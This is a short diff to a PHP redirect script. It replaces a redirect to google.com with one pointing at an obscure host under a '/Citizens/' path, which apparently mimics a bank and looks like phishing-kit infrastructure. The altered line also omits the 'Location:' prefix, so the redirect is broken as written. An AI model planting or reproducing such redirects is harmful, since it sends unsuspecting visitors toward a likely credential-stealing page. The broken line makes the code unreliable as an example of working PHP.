@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://google.com"); 
+header("https://beneath-underneath-014-rill.dumb1.com/Citizens/"); 
   
 exit; 
 ?> 
